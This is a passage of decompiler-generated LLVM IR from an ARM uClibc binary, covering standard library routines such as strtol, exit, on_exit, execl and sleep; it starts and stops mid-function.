  ret i32 %v8_14074

; uselistorder directives
  uselistorder i32 %v0_1403c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 20, 19, 21, 22, 23, 0, 1 }
  uselistorder i32 ()* @wait4, { 0, 1, 3, 2 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_14070, { 2, 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_1408c = call i32 @strtol()
  ret i32 %v0_1408c
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_14094 = call i32 @_stdlib_strto_l()
  ret i32 %v0_14094
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_14098 = load i32, i32* @r4, align 4
  store i32 %v3_14098, i32* %stack_var_-36, align 4
  %v0_1409c = load i32, i32* @r1, align 4
  store i32 %v0_1409c, i32* %sb.global-to-local, align 4
  %v0_140a0 = load i32, i32* @r2, align 4
  store i32 %v0_140a0, i32* %r5.global-to-local, align 4
  %v0_140a4 = load i32, i32* @r3, align 4
  store i32 %v0_140a4, i32* %fp.global-to-local, align 4
  %v0_140a8 = load i32, i32* @r0, align 4
  %v2_140bc.pre = load i32, i32* @global_var_2b898, align 4
  br label %dec_label_pc_140b4

dec_label_pc_140b4:                               ; preds = %dec_label_pc_140b4, %entry
  %v0_140ec = phi i32 [ %v0_140a8, %entry ], [ %v1_140b0, %dec_label_pc_140b4 ]
  store i32 %v0_140ec, i32* %r4.global-to-local, align 4
  %v1_140b8 = inttoptr i32 %v0_140ec to i8*
  %v2_140b8 = load i8, i8* %v1_140b8, align 1
  %v3_140b8 = zext i8 %v2_140b8 to i32
  %v3_140c0 = mul nuw nsw i32 %v3_140b8, 2
  %v4_140c0 = add i32 %v3_140c0, %v2_140bc.pre
  %v5_140c0 = inttoptr i32 %v4_140c0 to i8*
  %v6_140c0 = load i8, i8* %v5_140c0, align 1
  %v1_140c4 = and i8 %v6_140c0, 32
  %v2_140c4 = icmp eq i8 %v1_140c4, 0
  %v1_140b0 = add i32 %v0_140ec, 1
  br i1 %v2_140c4, label %dec_label_pc_140cc, label %dec_label_pc_140b4

dec_label_pc_140cc:                               ; preds = %dec_label_pc_140b4
  %v7_140cc = icmp eq i8 %v2_140b8, 43
  br i1 %v7_140cc, label %dec_label_pc_140ec, label %dec_label_pc_140d4

dec_label_pc_140d4:                               ; preds = %dec_label_pc_140cc
  %v7_140d4 = icmp eq i8 %v2_140b8, 45
  br i1 %v7_140d4, label %dec_label_pc_140ec, label %bb

bb:                                               ; preds = %dec_label_pc_140d4
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_140f0

dec_label_pc_140ec:                               ; preds = %dec_label_pc_140cc, %dec_label_pc_140d4
  %storemerge43 = phi i32 [ 1, %dec_label_pc_140d4 ], [ 0, %dec_label_pc_140cc ]
  store i32 %storemerge43, i32* %r7.global-to-local, align 4
  store i32 %v1_140b0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_140f0

dec_label_pc_140f0:                               ; preds = %bb, %dec_label_pc_140ec
  %v0_14110 = phi i32 [ %v0_140ec, %bb ], [ %v1_140b0, %dec_label_pc_140ec ]
  %v1_140f0 = and i32 %v0_140a0, -17
  %v3_140f0 = icmp eq i32 %v1_140f0, 0
  br i1 %v3_140f0, label %dec_label_pc_140fc, label %bb54

bb54:                                             ; preds = %dec_label_pc_140f0
  br label %bb58

dec_label_pc_140fc:                               ; preds = %dec_label_pc_140f0
  %v1_140fc = inttoptr i32 %v0_14110 to i8*
  %v2_140fc = load i8, i8* %v1_140fc, align 1
  %v7_14100 = icmp eq i8 %v2_140fc, 48
  %v1_14104 = add i32 %v0_140a0, 10
  store i32 %v1_14104, i32* %r5.global-to-local, align 4
  br i1 %v7_14100, label %dec_label_pc_14110, label %bb55

bb55:                                             ; preds = %dec_label_pc_140fc
  br label %.thread8

dec_label_pc_14110:                               ; preds = %dec_label_pc_140fc
  %v1_14110 = add i32 %v0_14110, 1
  %v2_14110 = inttoptr i32 %v1_14110 to i8*
  %v3_14110 = load i8, i8* %v2_14110, align 1
  %v4_14110 = zext i8 %v3_14110 to i32
  store i32 %v1_14110, i32* %r4.global-to-local, align 4
  %v1_14114 = or i32 %v4_14110, 32
  %v7_14118 = icmp eq i32 %v1_14114, 120
  %v1_1411c = add i32 %v0_140a0, 8
  store i32 %v1_1411c, i32* %r5.global-to-local, align 4
  br i1 %v7_14118, label %bb56, label %.thread8

bb56:                                             ; preds = %dec_label_pc_14110
  %v3_14128 = mul i32 %v1_1411c, 2
  store i32 %v3_14128, i32* %r5.global-to-local, align 4
  %v2_1412c = add i32 %v0_14110, 2
  store i32 %v2_1412c, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_14110, %bb55, %bb56
  %v1_141f028 = phi i32 [ %v0_140a8, %bb55 ], [ %v1_14110, %bb56 ], [ %v1_14110, %dec_label_pc_14110 ]
  %v0_1417819 = phi i32 [ %v0_14110, %bb55 ], [ %v2_1412c, %bb56 ], [ %v1_14110, %dec_label_pc_14110 ]
  %v0_14130 = phi i32 [ %v1_14104, %bb55 ], [ %v3_14128, %bb56 ], [ %v1_1411c, %dec_label_pc_14110 ]
  %v5_14134 = icmp slt i32 %v0_14130, 16
  br i1 %v5_14134, label %bb58, label %bb57

bb57:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb58

bb58:                                             ; preds = %bb54, %.thread8, %bb57
  %v1_141f027 = phi i32 [ %v0_140a8, %bb54 ], [ %v1_141f028, %.thread8 ], [ %v1_141f028, %bb57 ]
  %v0_1417818 = phi i32 [ %v0_14110, %bb54 ], [ %v0_1417819, %.thread8 ], [ %v0_1417819, %bb57 ]
  %v0_14148 = phi i32 [ %v0_140a0, %bb54 ], [ %v0_14130, %.thread8 ], [ 16, %bb57 ]
  %v1_14138 = add i32 %v0_14148, -2
  %tmp = icmp ugt i32 %v1_14138, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_14148

.thread:                                          ; preds = %bb58
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_141ec

dec_label_pc_14148:                               ; preds = %bb58
  %v2_14150 = urem i32 -1, %v0_14148
  %v1_14160 = urem i32 %v2_14150, 256
  store i32 %v1_14160, i32* %sl.global-to-local, align 4
  %v2_14164 = udiv i32 -1, %v0_14148
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v2_14164, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_14178

dec_label_pc_14174:                               ; preds = %bb65, %dec_label_pc_141d4
  %v0_14174 = phi i32 [ %v1_141a4, %bb65 ], [ %v0_14174.pre, %dec_label_pc_141d4 ]
  br label %dec_label_pc_14178

dec_label_pc_14178:                               ; preds = %dec_label_pc_14148, %dec_label_pc_14174
  %v1_141f025 = phi i32 [ %v1_141f027, %dec_label_pc_14148 ], [ %v0_14174, %dec_label_pc_14174 ]
  %v0_141a4 = phi i32 [ %v0_1417818, %dec_label_pc_14148 ], [ %v0_14174, %dec_label_pc_14174 ]
  %v1_14178 = inttoptr i32 %v0_141a4 to i8*
  %v2_14178 = load i8, i8* %v1_14178, align 1
  %v3_14178 = zext i8 %v2_14178 to i32
  %v1_1417c = add nsw i32 %v3_14178, -48
  %v1_14180 = urem i32 %v1_1417c, 256
  %v1_14188 = or i32 %v3_14178, 32
  %tmp73 = icmp ult i32 %v1_14180, 10
  br i1 %tmp73, label %bb60, label %dec_label_pc_14190

dec_label_pc_14190:                               ; preds = %dec_label_pc_14178
  %tmp74 = icmp ugt i32 %v1_14188, 96
  br i1 %tmp74, label %bb59, label %bb60

bb59:                                             ; preds = %dec_label_pc_14190
  %v1_14194 = add nsw i32 %v1_14188, -87
  %v5_1419c = urem i32 %v1_14194, 256
  br label %bb60

bb60:                                             ; preds = %dec_label_pc_14178, %dec_label_pc_14190, %bb59
  %v3_141cc = phi i32 [ %v1_14180, %dec_label_pc_14178 ], [ 40, %dec_label_pc_14190 ], [ %v5_1419c, %bb59 ]
  %v1_141a0 = load i32, i32* %r5.global-to-local, align 4
  %v1_141a4 = add i32 %v0_141a4, 1
  store i32 %v1_141a4, i32* %r4.global-to-local, align 4
  %v6_141a8 = icmp slt i32 %v3_141cc, %v1_141a0
  br i1 %v6_141a8, label %dec_label_pc_141ac, label %dec_label_pc_141ec.loopexit

dec_label_pc_141ac:                               ; preds = %bb60
  %v0_141ac = load i32, i32* %ip.global-to-local, align 4
  %v1_141ac = load i32, i32* %r8.global-to-local, align 4
  %v9_141ac = icmp eq i32 %v0_141ac, %v1_141ac
  br i1 %v9_141ac, label %.thread37, label %bb61

.thread37:                                        ; preds = %dec_label_pc_141ac
  br label %dec_label_pc_141bc

bb61:                                             ; preds = %dec_label_pc_141ac
  %v3_141ac = icmp ult i32 %v0_141ac, %v1_141ac
  br i1 %v3_141ac, label %dec_label_pc_141bc, label %dec_label_pc_141d4

dec_label_pc_141bc:                               ; preds = %bb61, %.thread37
  %v4_141c42240 = phi i32 [ 1, %.thread37 ], [ 0, %bb61 ]
  %v1_141bc = load i32, i32* %sl.global-to-local, align 4
  %v3_141bc = icmp uge i32 %v3_141cc, %v1_141bc
  %v9_141bc = icmp eq i32 %v3_141cc, %v1_141bc
  %v2_141c0 = xor i1 %v3_141bc, true
  %v3_141c0 = or i1 %v9_141bc, %v2_141c0
  br i1 %v3_141c0, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_141bc
  br label %bb63

bb63:                                             ; preds = %dec_label_pc_141bc, %bb62
  %v4_141c4 = phi i32 [ %v4_141c42240, %dec_label_pc_141bc ], [ 0, %bb62 ]
  %v2_141c4 = xor i1 %v9_141bc, true
  %v3_141c4 = and i1 %v3_141bc, %v2_141c4
  br i1 %v3_141c4, label %bb64, label %thread-pre-split

bb64:                                             ; preds = %bb63
  %v5_141c4 = urem i32 %v4_141c4, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb63, %bb64
  %v0_141c8 = phi i32 [ %v5_141c4, %bb64 ], [ %v4_141c4, %bb63 ]
  %v2_141c8 = icmp eq i32 %v0_141c8, 0
  br i1 %v2_141c8, label %bb65, label %dec_label_pc_141d4

bb65:                                             ; preds = %thread-pre-split
  %v4_141cc = mul i32 %v0_141ac, %v1_141a0
  %v5_141cc = add i32 %v4_141cc, %v3_141cc
  store i32 %v5_141cc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14174

dec_label_pc_141d4:                               ; preds = %bb61, %thread-pre-split
  %v0_141d4 = call i32 @__errno_location()
  %v0_141d8 = load i32, i32* %r7.global-to-local, align 4
  %v1_141d8 = load i32, i32* %fp.global-to-local, align 4
  %v2_141d8 = and i32 %v1_141d8, %v0_141d8
  store i32 %v2_141d8, i32* %r7.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  %v2_141e4 = inttoptr i32 %v0_141d4 to i32*
  store i32 34, i32* %v2_141e4, align 4
  %v0_14174.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14174

dec_label_pc_141ec.loopexit:                      ; preds = %bb60
  %v0_141ec.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_141ec

dec_label_pc_141ec:                               ; preds = %.thread, %dec_label_pc_141ec.loopexit
  %v1_141f0 = phi i32 [ %v1_141f025, %dec_label_pc_141ec.loopexit ], [ %v1_141f027, %.thread ]
  %v2_141f0 = phi i32 [ %v0_141ec.pre, %dec_label_pc_141ec.loopexit ], [ %v0_1409c, %.thread ]
  %v2_141ec = icmp eq i32 %v2_141f0, 0
  br i1 %v2_141ec, label %bb67, label %bb66

bb66:                                             ; preds = %dec_label_pc_141ec
  %v3_141f0 = inttoptr i32 %v2_141f0 to i32*
  store i32 %v1_141f0, i32* %v3_141f0, align 4
  br label %bb67

bb67:                                             ; preds = %dec_label_pc_141ec, %bb66
  %v0_141f4 = load i32, i32* %r7.global-to-local, align 4
  %v2_141f4 = icmp eq i32 %v0_141f4, 0
  %. = select i1 %v2_141f4, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v0_14200 = load i32, i32* %fp.global-to-local, align 4
  %v2_14200 = icmp eq i32 %v0_14200, 0
  %v0_14224.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_14200, label %dec_label_pc_1421c, label %bb70

bb70:                                             ; preds = %bb67
  %tmp75 = icmp ugt i32 %v0_14224.pre.pre, %.
  br i1 %tmp75, label %dec_label_pc_1420c, label %dec_label_pc_1421c

dec_label_pc_1420c:                               ; preds = %bb70
  %v0_1420c = call i32 @__errno_location()
  %v2_14214 = inttoptr i32 %v0_1420c to i32*
  store i32 34, i32* %v2_14214, align 4
  %v0_14218 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14218, i32* %ip.global-to-local, align 4
  %v0_1421c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1421c

dec_label_pc_1421c:                               ; preds = %bb70, %bb67, %dec_label_pc_1420c
  %v0_14224.pre = phi i32 [ %v0_14224.pre.pre, %bb70 ], [ %v0_14218, %dec_label_pc_1420c ], [ %v0_14224.pre.pre, %bb67 ]
  %v0_1421c = phi i32 [ %v0_141f4, %bb70 ], [ %v0_1421c.pre, %dec_label_pc_1420c ], [ %v0_141f4, %bb67 ]
  %v2_1421c = icmp eq i32 %v0_1421c, 0
  br i1 %v2_1421c, label %dec_label_pc_1421c._crit_edge, label %bb71

bb71:                                             ; preds = %dec_label_pc_1421c
  %v2_14220 = sub i32 0, %v0_14224.pre
  store i32 %v2_14220, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1421c._crit_edge

dec_label_pc_1421c._crit_edge:                    ; preds = %dec_label_pc_1421c, %bb71
  %v0_14224 = phi i32 [ %v2_14220, %bb71 ], [ %v0_14224.pre, %dec_label_pc_1421c ]
  %v2_14228 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_14228, i32* @r4, align 4
  ret i32 %v0_14224

; uselistorder directives
  uselistorder i32 %v0_14224.pre, { 1, 0 }
  uselistorder i32 %v0_14224.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_141c4, { 1, 0 }
  uselistorder i1 %v3_141bc, { 1, 0 }
  uselistorder i32 %v1_141bc, { 1, 0 }
  uselistorder i32 %v1_141a4, { 1, 0 }
  uselistorder i32 %v1_14188, { 1, 0 }
  uselistorder i32 %v1_14180, { 1, 0 }
  uselistorder i32 %v0_14174, { 1, 0 }
  uselistorder i32 %v0_14148, { 1, 0, 2 }
  uselistorder i32 %v3_14128, { 1, 0 }
  uselistorder i32 %v1_1411c, { 1, 0, 2 }
  uselistorder i32 %v0_14110, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_140b0, { 1, 0, 2 }
  uselistorder i32 %v0_140a8, { 1, 0, 2 }
  uselistorder i32 %v0_140a0, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7 }
  uselistorder label %dec_label_pc_1421c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1421c, { 2, 0, 1 }
  uselistorder label %bb67, { 1, 0 }
  uselistorder label %dec_label_pc_141ec, { 1, 0 }
  uselistorder label %dec_label_pc_141d4, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb63, { 1, 0 }
  uselistorder label %bb60, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14178, { 1, 0 }
  uselistorder label %dec_label_pc_14174, { 1, 0 }
  uselistorder label %bb58, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_140f0, { 1, 0 }
  uselistorder label %dec_label_pc_140ec, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_14230 = ptrtoint i32* %stack_var_-16 to i32
  store i32 ptrtoint (i8* @global_var_f360.275 to i32), i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_2b878.758 to i32), i32* @r2, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v2_14230, i32* @r0, align 4
  %v1_1424c = call i32 @__pthread_cleanup_push_defer()
  %v2_1425c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2b878.758 to i32))
  %v2_14264 = load i32, i32* @global_var_300b8.762, align 4
  %v2_14268 = icmp eq i32 %v2_14264, 0
  br i1 %v2_14268, label %.thread1, label %bb

bb:                                               ; preds = %entry
  call void @__pseudo_branch(i32 %v2_14264)
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  store i32 %v2_14230, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  store i32 82572, i32* @lr, align 4
  %v1_14288 = call i32 @__pthread_cleanup_pop_restore()
  store i32 %v1_14288, i32* @r0, align 4
  %v1_1428c = call i32 @__GI___uClibc_fini(i32 %v1_14288)
  store i32 82592, i32* @lr, align 4
  %v2_1429c = call i32 @_stdio_term()
  %v0_142a0 = load i32, i32* @r4, align 4
  %v1_142a4 = call i32 @__GI__exit(i32 %v0_142a0)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 0, 4, 6, 1, 5, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @on_exit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  %v0_142d0 = call i32 @__new_exitfn()
  %v2_142d4 = icmp eq i32 %v0_142d0, 0
  %. = select i1 %v2_142d4, i32 -1, i32 2
  store i32 %., i32* %r3.global-to-local, align 4
  br i1 %v2_142d4, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v3_142e0 = inttoptr i32 %v0_142d0 to i32*
  store i32 %., i32* %v3_142e0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_142e8 = load i32, i32* @r4, align 4
  %v3_142e8 = add i32 %v0_142d0, 4
  %v4_142e8 = inttoptr i32 %v3_142e8 to i32*
  store i32 %v1_142e8, i32* %v4_142e8, align 4
  %v1_142ec = load i32, i32* @r5, align 4
  %v3_142ec = add i32 %v0_142d0, 8
  %v4_142ec = inttoptr i32 %v3_142ec to i32*
  store i32 %v1_142ec, i32* %v4_142ec, align 4
  %v0_142f0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  %v0_142f0 = phi i32 [ -1, %entry ], [ %v0_142f0.pre, %bb ]
  ret i32 %v0_142f0

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_142f8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_142f8, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_14308 = ptrtoint i32* %stack_var_-32 to i32
  %v2_1430c = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_1430c, i32* %stack_var_-32, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_14318

dec_label_pc_14318:                               ; preds = %dec_label_pc_14318, %entry
  %v0_1432c = phi i32 [ %v1_1432c, %dec_label_pc_14318 ], [ 0, %entry ]
  %v3_14318 = phi i32 [ %v1_14320, %dec_label_pc_14318 ], [ %v2_1430c, %entry ]
  %v1_1431c = inttoptr i32 %v3_14318 to i32*
  %v2_1431c = load i32, i32* %v1_1431c, align 4
  %v1_14320 = add i32 %v3_14318, 4
  %v2_14324 = icmp eq i32 %v2_1431c, 0
  store i32 %v1_14320, i32* %stack_var_-32, align 4
  %v1_1432c = add i32 %v0_1432c, 1
  store i32 %v1_1432c, i32* %lr.global-to-local, align 4
  br i1 %v2_14324, label %dec_label_pc_14334, label %dec_label_pc_14318

dec_label_pc_14334:                               ; preds = %dec_label_pc_14318
  %v3_14334.neg = mul i32 %v1_1432c, -4
  %v1_14338.neg = add i32 %v2_14308, -8
  %v2_1433c = add i32 %v1_14338.neg, %v3_14334.neg
  %v2_14344 = inttoptr i32 %v2_1433c to i32*
  store i32 %arg1, i32* %v2_14344, align 4
  store i32 %v2_1430c, i32* %stack_var_-32, align 4
  %v0_14350 = load i32, i32* @sp, align 4
  store i32 %v0_14350, i32* @r1, align 4
  store i32 %v0_14350, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14358

dec_label_pc_14358:                               ; preds = %dec_label_pc_14358.dec_label_pc_14358_crit_edge, %dec_label_pc_14334
  %v1_1436c = phi i32 [ %v5_1436c, %dec_label_pc_14358.dec_label_pc_14358_crit_edge ], [ %v0_14350, %dec_label_pc_14334 ]
  %v3_14358 = phi i32 [ %v3_14358.pre, %dec_label_pc_14358.dec_label_pc_14358_crit_edge ], [ %v2_1430c, %dec_label_pc_14334 ]
  %v1_1435c = inttoptr i32 %v3_14358 to i32*
  %v2_1435c = load i32, i32* %v1_1435c, align 4
  %v0_14360 = load i32, i32* %lr.global-to-local, align 4
  %v1_14360 = add i32 %v0_14360, -1
  store i32 %v1_14360, i32* %lr.global-to-local, align 4
  %v7_14360 = icmp eq i32 %v0_14360, 1
  %v1_14364 = add i32 %v3_14358, 4
  store i32 %v1_14364, i32* %stack_var_-32, align 4
  %v2_1436c = add i32 %v1_1436c, 4
  %v3_1436c = inttoptr i32 %v2_1436c to i32*
  store i32 %v2_1435c, i32* %v3_1436c, align 4
  %v4_1436c = load i32, i32* %ip.global-to-local, align 4
  %v5_1436c = add i32 %v4_1436c, 4
  store i32 %v5_1436c, i32* %ip.global-to-local, align 4
  br i1 %v7_14360, label %dec_label_pc_14374, label %dec_label_pc_14358.dec_label_pc_14358_crit_edge

dec_label_pc_14358.dec_label_pc_14358_crit_edge:  ; preds = %dec_label_pc_14358
  %v3_14358.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_14358

dec_label_pc_14374:                               ; preds = %dec_label_pc_14358
  %v2_14378 = load i32, i32* @global_var_300c4.767, align 4
  store i32 %v2_14378, i32* @r2, align 4
  %v0_1437c = call i32 @__GI_execve()
  ret i32 %v0_1437c

; uselistorder directives
  uselistorder i32 %v5_1436c, { 1, 0 }
  uselistorder i32 %v0_14360, { 1, 0 }
  uselistorder i32 %v1_1432c, { 0, 2, 1 }
  uselistorder i32 %v1_14320, { 1, 0 }
  uselistorder i32 %v3_14318, { 1, 0 }
  uselistorder i32 %v2_1430c, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-424 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1438c = load i32, i32* @r4, align 4
  store i32 %v3_1438c, i32* %stack_var_-20, align 4
  %v6_1438c = load i32, i32* @r5, align 4
  %v9_1438c = load i32, i32* @r6, align 4
  %v16_1438c = ptrtoint i32* %stack_var_-20 to i32
  store i32 %arg1, i32* %ip.global-to-local, align 4
  %v2_14390 = icmp eq i32 %arg1, 0
  %v2_14394 = ptrtoint i32* %stack_var_-424 to i32
  br i1 %v2_14390, label %dec_label_pc_14518, label %dec_label_pc_143ac.preheader

dec_label_pc_143ac.preheader:                     ; preds = %entry
  store i32 31, i32* %r1.global-to-local, align 4
  %v5_143b417 = add i32 %v16_1438c, 124
  br label %dec_label_pc_143a4

dec_label_pc_143a4:                               ; preds = %dec_label_pc_143ac.preheader, %dec_label_pc_143a4
  %v5_143b418 = phi i32 [ %v5_143b417, %dec_label_pc_143ac.preheader ], [ %v5_143b4, %dec_label_pc_143a4 ]
  %v2_143a8 = add i32 %v5_143b418, -136
  %v3_143a8 = inttoptr i32 %v2_143a8 to i32*
  store i32 0, i32* %v3_143a8, align 4
  %v0_143ac.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_143ac = add i32 %v0_143ac.pre, -1
  store i32 %v1_143ac, i32* %r1.global-to-local, align 4
  %v6_143ac = icmp slt i32 %v1_143ac, 0
  %v4_143b4 = mul i32 %v1_143ac, 4
  %v5_143b4 = add i32 %v4_143b4, %v16_1438c
  br i1 %v6_143ac, label %dec_label_pc_143bc, label %dec_label_pc_143a4

dec_label_pc_143bc:                               ; preds = %dec_label_pc_143a4
  %v2_143bc = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_143bc, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v2_143bc, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_143cc = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_143cc, i32* %stack_var_-28, align 4
  %v0_143d4 = call i32 @__sigaddset()
  store i32 %v0_143d4, i32* %r0.global-to-local, align 4
  %v1_143d8 = load i32, i32* @r5, align 4
  %v5_143dc = icmp slt i32 %v0_143d4, %v1_143d8
  br i1 %v5_143dc, label %dec_label_pc_14520, label %dec_label_pc_143e0

dec_label_pc_143e0:                               ; preds = %dec_label_pc_143bc
  %v2_143e0 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_143e0, i32* @r4, align 4
  store i32 %v1_143d8, i32* %r0.global-to-local, align 4
  store i32 %v2_143bc, i32* %r1.global-to-local, align 4
  %v3_143f0 = bitcast i32* %stack_var_-156 to %_TYPEDEF_sigset_t*
  %v4_143f0 = call i32 @__GI_sigprocmask(i32 %v1_143d8, %_TYPEDEF_sigset_t* %v3_143f0, i32 %v2_143e0)
  store i32 %v4_143f0, i32* %r0.global-to-local, align 4
  %v1_143f4 = load i32, i32* @r5, align 4
  %v9_143f4 = icmp eq i32 %v4_143f0, %v1_143f4
  br i1 %v9_143f4, label %dec_label_pc_143fc, label %dec_label_pc_14520

dec_label_pc_143fc:                               ; preds = %dec_label_pc_143e0
  store i32 17, i32* @r1, align 4
  store i32 %v2_143e0, i32* @r0, align 4
  %v0_14404 = call i32 @__sigismember()
  store i32 %v0_14404, i32* %r0.global-to-local, align 4
  %v1_14408 = load i32, i32* @r5, align 4
  %v9_14408 = icmp eq i32 %v0_14404, %v1_14408
  br i1 %v9_14408, label %dec_label_pc_14420.preheader, label %dec_label_pc_143fc.dec_label_pc_144e8_crit_edge

dec_label_pc_143fc.dec_label_pc_144e8_crit_edge:  ; preds = %dec_label_pc_143fc
  %.pre = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_144e8

dec_label_pc_14420.preheader:                     ; preds = %dec_label_pc_143fc
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14418

dec_label_pc_14418:                               ; preds = %dec_label_pc_14420.preheader, %dec_label_pc_14418
  %v5_1442816 = phi i32 [ %v5_143b417, %dec_label_pc_14420.preheader ], [ %v5_14428, %dec_label_pc_14418 ]
  %v2_1441c = add i32 %v5_1442816, -136
  %v3_1441c = inttoptr i32 %v2_1441c to i32*
  store i32 0, i32* %v3_1441c, align 4
  %v0_14420.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_14420 = add i32 %v0_14420.pre, -1
  store i32 %v1_14420, i32* %r1.global-to-local, align 4
  %v6_14420 = icmp slt i32 %v1_14420, 0
  %v4_14428 = mul i32 %v1_14420, 4
  %v5_14428 = add i32 %v4_14428, %v16_1438c
  br i1 %v6_14420, label %dec_label_pc_14430, label %dec_label_pc_14418

dec_label_pc_14430:                               ; preds = %dec_label_pc_14418
  store i32 %v2_143bc, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_14438 = call i32 @__sigaddset()
  store i32 %v0_14438, i32* %r0.global-to-local, align 4
  %v1_1443c = icmp slt i32 %v0_14438, 0
  br i1 %v1_1443c, label %dec_label_pc_14520, label %dec_label_pc_14444

dec_label_pc_14444:                               ; preds = %dec_label_pc_14430
  store i32 17, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_14450 = call i32 @__GI_sigaction(i32 17, i32* null, i32 %v2_14394)
  store i32 %v4_14450, i32* %r0.global-to-local, align 4
  %v1_14454 = icmp slt i32 %v4_14450, 0
  br i1 %v1_14454, label %dec_label_pc_1445c, label %dec_label_pc_14484

dec_label_pc_1445c:                               ; preds = %dec_label_pc_14444
